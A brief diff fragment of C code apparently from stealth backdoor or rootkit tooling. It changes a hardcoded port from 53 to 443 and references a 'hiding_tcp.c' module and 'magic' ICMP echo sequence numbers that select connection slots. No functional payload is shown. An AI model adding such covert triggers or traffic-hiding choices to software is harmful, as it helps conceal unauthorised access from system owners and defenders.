@@ -5,7 +5,7 @@
 
 /* Per-slot hardcoded ports (must match hiding_tcp.c PORT / PORT2) */
 #define SRV_PORT  "123"
-#define SRV_PORT2 "53"
+#define SRV_PORT2 "443"
 
 /* Magic ICMP echo sequences that identify which slot to fill */
 #define ICMP_MAGIC_SEQ  1337   /* slot 0 */
